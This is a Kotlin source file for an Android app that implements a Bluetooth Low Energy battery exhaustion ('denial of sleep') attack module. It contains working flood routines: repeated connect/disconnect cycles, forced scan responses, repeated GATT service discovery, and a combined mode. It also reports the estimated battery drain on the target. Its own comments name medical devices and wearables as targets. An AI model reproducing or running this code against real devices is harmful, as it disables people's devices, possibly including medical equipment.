package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanFilter
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.isActive
import kotlin.coroutines.cancellation.CancellationException

/**
 * Enum defining the exhaustion attack modes for BLE Battery Exhaustion.
 *
 * Each mode targets a different aspect of the BLE stack to prevent the
 * target device from entering power-saving mode.
 */
enum class ExhaustionMode(val displayName: String) {
    /** Rapidly connect and disconnect to drain battery via connection setup overhead. */
    CONNECTION_FLOOD("Connection Flood"),
    /** Send repeated scan requests to force the target to generate scan responses. */
    SCAN_RESPONSE_FLOOD("Scan Response Flood"),
    /** Perform repeated GATT service discovery to exhaust processing resources. */
    SERVICE_DISCOVERY_FLOOD("Service Discovery Flood"),
    /** Combine all three methods across all advertising channels (37, 38, 39). */
    ALL_CHANNELS("All Channels (Combined)")
}

/**
 * Module responsible for executing BLE Battery Exhaustion / Denial of Sleep attacks.
 *
 * This attack floods battery-powered IoT devices (BLE mesh nodes, sensors, medical
 * devices, wearables) with connection requests, scan responses, or service discovery
 * queries to prevent the target from entering power-saving mode, thereby accelerating
 * battery drain.
 *
 * Flooding all three advertising channels (37, 38, 39) maximizes impact by ensuring
 * the target cannot sleep on any channel.
 *
 * This module does NOT require root -- it uses standard Android BLE scan/connect APIs
 * (BluetoothLeScanner, BluetoothGatt) which are available in userspace.
 *
 * @property context The application context, required to access system Bluetooth services.
 */
class BatteryExhaustionModule(private val context: Context) {

    companion object {
        private const val TAG = "BatteryExhaustion"

        /** Delay between connection attempts in milliseconds. */
        private const val CONNECTION_CYCLE_DELAY_MS = 50L

        /** Delay between scan bursts in milliseconds. */
        private const val SCAN_BURST_DELAY_MS = 30L

        /** Delay between service discovery attempts in milliseconds. */
        private const val DISCOVERY_CYCLE_DELAY_MS = 100L

        /** Estimated milliamp-hours drained per connection cycle on a typical BLE device. */
        private const val ESTIMATED_MAH_PER_CONNECTION = 0.002

        /** Estimated milliamp-hours drained per scan response forced. */
        private const val ESTIMATED_MAH_PER_SCAN_RESPONSE = 0.001

        /** Estimated milliamp-hours drained per service discovery cycle. */
        private const val ESTIMATED_MAH_PER_DISCOVERY = 0.003
    }

    private val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val bluetoothAdapter = bluetoothManager.adapter
    private var scanner: BluetoothLeScanner? = bluetoothAdapter?.bluetoothLeScanner

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning

    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var attackJob: Job? = null

    // Counters for attack statistics.
    private var connectionCount = 0
    private var scanResponseCount = 0
    private var discoveryCount = 0
    private var estimatedDrainMah = 0.0

    /**
     * Starts the battery exhaustion attack against the specified target device.
     *
     * @param targetDevice The BLE device to target.
     * @param mode The exhaustion mode to use.
     * @return A Flow emitting progress logs.
     * @throws IllegalArgumentException if the target MAC address is invalid.
     */
    fun startAttack(targetDevice: TargetDevice, mode: ExhaustionMode): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)

        // Pre-flight checks.
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            emit("ERROR: Bluetooth not enabled.")
            return@flow
        }

        scanner = bluetoothAdapter.bluetoothLeScanner
        if (scanner == null) {
            emit("ERROR: BLE Scanner not available.")
            return@flow
        }

        if (_isRunning.value) {
            emit("ERROR: Attack already running.")
            return@flow
        }

        _isRunning.value = true
        _error.value = null
        connectionCount = 0
        scanResponseCount = 0
        discoveryCount = 0
        estimatedDrainMah = 0.0

        emit("=== BLE Battery Exhaustion Attack ===")
        emit("Target: ${targetDevice.name ?: "Unknown Device"} ($mac)")
        emit("Mode: ${mode.displayName}")
        emit("Advertising channels: 37, 38, 39")
        emit("")
        emit("Starting attack...")

        try {
            when (mode) {
                ExhaustionMode.CONNECTION_FLOOD -> {
                    emit("Phase: Connection Flood")
                    emit("Rapidly connecting/disconnecting to drain target battery...")
                    connectionFlood(mac, this)
                }
                ExhaustionMode.SCAN_RESPONSE_FLOOD -> {
                    emit("Phase: Scan Response Flood")
                    emit("Forcing repeated scan responses from target...")
                    scanResponseFlood(mac, this)
                }
                ExhaustionMode.SERVICE_DISCOVERY_FLOOD -> {
                    emit("Phase: Service Discovery Flood")
                    emit("Flooding target with GATT service discovery queries...")
                    serviceDiscoveryFlood(mac, this)
                }
                ExhaustionMode.ALL_CHANNELS -> {
                    emit("Phase: Combined Attack (All Channels)")
                    emit("Running connection flood + scan flood + discovery flood...")
                    allChannelsFlood(mac, this)
                }
            }
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            val msg = "Attack error: ${e.message}"
            Log.e(TAG, msg, e)
            emit("ERROR: $msg")
            _error.value = msg
        } finally {
            _isRunning.value = false
            emit("")
            emit("=== Attack Summary ===")
            emit("Connection cycles: $connectionCount")
            emit("Scan responses forced: $scanResponseCount")
            emit("Service discoveries: $discoveryCount")
            emit("Estimated power drain: ${"%.4f".format(estimatedDrainMah)} mAh")
            emit("Attack stopped.")
        }
    }

    /**
     * Rapidly connects and disconnects from the target device to prevent it from
     * entering sleep mode. Each connection handshake forces the target to wake its
     * radio, negotiate parameters, and allocate resources.
     */
    @SuppressLint("MissingPermission")
    private suspend fun connectionFlood(
        mac: String,
        collector: kotlinx.coroutines.flow.FlowCollector<String>
    ) {
        val device = bluetoothAdapter?.getRemoteDevice(mac) ?: run {
            collector.emit("ERROR: Could not resolve device $mac")
            return
        }

        while (_isRunning.value) {
            try {
                val callback = object : BluetoothGattCallback() {
                    override fun onConnectionStateChange(
                        gatt: BluetoothGatt,
                        status: Int,
                        newState: Int
                    ) {
                        when (newState) {
                            BluetoothProfile.STATE_CONNECTED -> {
                                connectionCount++
                                estimatedDrainMah += ESTIMATED_MAH_PER_CONNECTION
                                Log.d(TAG, "Connected #$connectionCount, disconnecting...")
                                try {
                                    gatt.disconnect()
                                } catch (e: SecurityException) {
                                    Log.w(TAG, "SecurityException on disconnect: ${e.message}")
                                }
                            }
                            BluetoothProfile.STATE_DISCONNECTED -> {
                                try {
                                    gatt.close()
                                } catch (e: Exception) {
                                    Log.w(TAG, "Error closing GATT: ${e.message}")
                                }
                            }
                        }
                    }
                }

                val gatt = device.connectGatt(
                    context, false, callback, BluetoothDevice.TRANSPORT_LE
                )

                delay(CONNECTION_CYCLE_DELAY_MS)

                // Force close if still lingering.
                try {
                    gatt?.disconnect()
                    gatt?.close()
                } catch (e: Exception) {
                    // Suppress cleanup errors.
                }

                if (connectionCount % 50 == 0 && connectionCount > 0) {
                    collector.emit(
                        "Connection cycles: $connectionCount | " +
                        "Est. drain: ${"%.4f".format(estimatedDrainMah)} mAh"
                    )
                }

                delay(CONNECTION_CYCLE_DELAY_MS)
            } catch (e: Exception) {
                if (e is CancellationException) throw e
                Log.w(TAG, "Connection cycle error: ${e.message}")
                delay(100)
            }
        }
    }

    /**
     * Forces the target to generate scan responses by performing rapid targeted
     * BLE scans filtered to the target's MAC address. Each scan request that
     * reaches the target forces it to wake and transmit a scan response.
     */
    @SuppressLint("MissingPermission")
    private suspend fun scanResponseFlood(
        mac: String,
        collector: kotlinx.coroutines.flow.FlowCollector<String>
    ) {
        val scanFilter = ScanFilter.Builder()
            .setDeviceAddress(mac)
            .build()

        val scanSettings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .setReportDelay(0)
            .build()

        val scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult?) {
                result?.let {
                    scanResponseCount++
                    estimatedDrainMah += ESTIMATED_MAH_PER_SCAN_RESPONSE
                    Log.d(TAG, "Scan response #$scanResponseCount from ${it.device.address}")
                }
            }

            override fun onScanFailed(errorCode: Int) {
                Log.e(TAG, "Scan failed with error code: $errorCode")
                _error.value = "Scan failed: error code $errorCode"
            }
        }

        while (_isRunning.value) {
            try {
                scanner?.startScan(listOf(scanFilter), scanSettings, scanCallback)
                delay(SCAN_BURST_DELAY_MS)
                scanner?.stopScan(scanCallback)

                if (scanResponseCount % 100 == 0 && scanResponseCount > 0) {
                    collector.emit(
                        "Scan responses forced: $scanResponseCount | " +
                        "Est. drain: ${"%.4f".format(estimatedDrainMah)} mAh"
                    )
                }

                delay(SCAN_BURST_DELAY_MS)
            } catch (e: Exception) {
                if (e is CancellationException) throw e
                Log.w(TAG, "Scan cycle error: ${e.message}")
                delay(100)
            }
        }
    }

    /**
     * Connects to the target and repeatedly initiates GATT service discovery.
     * Each discovery forces the target to enumerate and transmit all services,
     * characteristics, and descriptors -- a CPU and radio intensive operation.
     */
    @SuppressLint("MissingPermission")
    private suspend fun serviceDiscoveryFlood(
        mac: String,
        collector: kotlinx.coroutines.flow.FlowCollector<String>
    ) {
        val device = bluetoothAdapter?.getRemoteDevice(mac) ?: run {
            collector.emit("ERROR: Could not resolve device $mac")
            return
        }

        while (_isRunning.value) {
            try {
                var discoveryDone = false
                var connected = false

                val callback = object : BluetoothGattCallback() {
                    override fun onConnectionStateChange(
                        gatt: BluetoothGatt,
                        status: Int,
                        newState: Int
                    ) {
                        when (newState) {
                            BluetoothProfile.STATE_CONNECTED -> {
                                connected = true
                                try {
                                    gatt.discoverServices()
                                } catch (e: SecurityException) {
                                    Log.w(TAG, "SecurityException on discoverServices: ${e.message}")
                                    discoveryDone = true
                                }
                            }
                            BluetoothProfile.STATE_DISCONNECTED -> {
                                discoveryDone = true
                                try {
                                    gatt.close()
                                } catch (e: Exception) {
                                    // Suppress cleanup errors.
                                }
                            }
                        }
                    }

                    override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                        discoveryCount++
                        estimatedDrainMah += ESTIMATED_MAH_PER_DISCOVERY
                        val serviceCount = gatt.services?.size ?: 0
                        Log.d(TAG, "Discovery #$discoveryCount: $serviceCount services found")
                        try {
                            gatt.disconnect()
                        } catch (e: SecurityException) {
                            Log.w(TAG, "SecurityException on disconnect: ${e.message}")
                        }
                        discoveryDone = true
                    }
                }

                val gatt = device.connectGatt(
                    context, false, callback, BluetoothDevice.TRANSPORT_LE
                )

                // Wait for discovery cycle to complete or timeout.
                var waitTime = 0L
                while (!discoveryDone && waitTime < 5000L && _isRunning.value) {
                    delay(50)
                    waitTime += 50
                }

                try {
                    gatt?.disconnect()
                    gatt?.close()
                } catch (e: Exception) {
                    // Suppress cleanup errors.
                }

                if (discoveryCount % 20 == 0 && discoveryCount > 0) {
                    collector.emit(
                        "Service discoveries: $discoveryCount | " +
                        "Est. drain: ${"%.4f".format(estimatedDrainMah)} mAh"
                    )
                }

                delay(DISCOVERY_CYCLE_DELAY_MS)
            } catch (e: Exception) {
                if (e is CancellationException) throw e
                Log.w(TAG, "Discovery cycle error: ${e.message}")
                delay(100)
            }
        }
    }

    /**
     * Combines all three attack modes for maximum impact across all BLE
     * advertising channels (37, 38, 39). Alternates between connection flood,
     * scan response flood, and service discovery flood in rapid succession.
     */
    @SuppressLint("MissingPermission")
    private suspend fun allChannelsFlood(
        mac: String,
        collector: kotlinx.coroutines.flow.FlowCollector<String>
    ) {
        val device = bluetoothAdapter?.getRemoteDevice(mac) ?: run {
            collector.emit("ERROR: Could not resolve device $mac")
            return
        }

        // Start persistent scan in background for scan response flood.
        val scanFilter = ScanFilter.Builder()
            .setDeviceAddress(mac)
            .build()

        val scanSettings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .setReportDelay(0)
            .build()

        val scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult?) {
                result?.let {
                    scanResponseCount++
                    estimatedDrainMah += ESTIMATED_MAH_PER_SCAN_RESPONSE
                }
            }
        }

        try {
            scanner?.startScan(listOf(scanFilter), scanSettings, scanCallback)
            collector.emit("Persistent scan started on target...")
        } catch (e: Exception) {
            collector.emit("Warning: Could not start persistent scan: ${e.message}")
        }

        var cycle = 0
        try {
            while (_isRunning.value) {
                cycle++

                // Alternate between connection flood and service discovery.
                try {
                    val callback = object : BluetoothGattCallback() {
                        override fun onConnectionStateChange(
                            gatt: BluetoothGatt,
                            status: Int,
                            newState: Int
                        ) {
                            when (newState) {
                                BluetoothProfile.STATE_CONNECTED -> {
                                    connectionCount++
                                    estimatedDrainMah += ESTIMATED_MAH_PER_CONNECTION

                                    // Every other connection, do service discovery too.
                                    if (cycle % 2 == 0) {
                                        try {
                                            gatt.discoverServices()
                                        } catch (e: SecurityException) {
                                            try { gatt.disconnect() } catch (_: Exception) {}
                                        }
                                    } else {
                                        try { gatt.disconnect() } catch (_: Exception) {}
                                    }
                                }
                                BluetoothProfile.STATE_DISCONNECTED -> {
                                    try { gatt.close() } catch (_: Exception) {}
                                }
                            }
                        }

                        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                            discoveryCount++
                            estimatedDrainMah += ESTIMATED_MAH_PER_DISCOVERY
                            try { gatt.disconnect() } catch (_: Exception) {}
                        }
                    }

                    val gatt = device.connectGatt(
                        context, false, callback, BluetoothDevice.TRANSPORT_LE
                    )

                    delay(CONNECTION_CYCLE_DELAY_MS * 2)

                    try {
                        gatt?.disconnect()
                        gatt?.close()
                    } catch (e: Exception) {
                        // Suppress cleanup errors.
                    }
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                    Log.w(TAG, "Combined cycle error: ${e.message}")
                }

                if (cycle % 30 == 0) {
                    collector.emit(
                        "Connections: $connectionCount | Scans: $scanResponseCount | " +
                        "Discoveries: $discoveryCount | " +
                        "Est. drain: ${"%.4f".format(estimatedDrainMah)} mAh"
                    )
                }

                delay(SCAN_BURST_DELAY_MS)
            }
        } finally {
            try {
                scanner?.stopScan(scanCallback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping scan: ${e.message}")
            }
        }
    }

    /**
     * Stops the currently running attack.
     */
    fun stopAttack() {
        _isRunning.value = false
        attackJob?.cancel()
        attackJob = null
    }

    /**
     * Releases all resources: stops any running attack and cancels the coroutine scope.
     */
    fun close() {
        stopAttack()
        scope.cancel()
    }
}
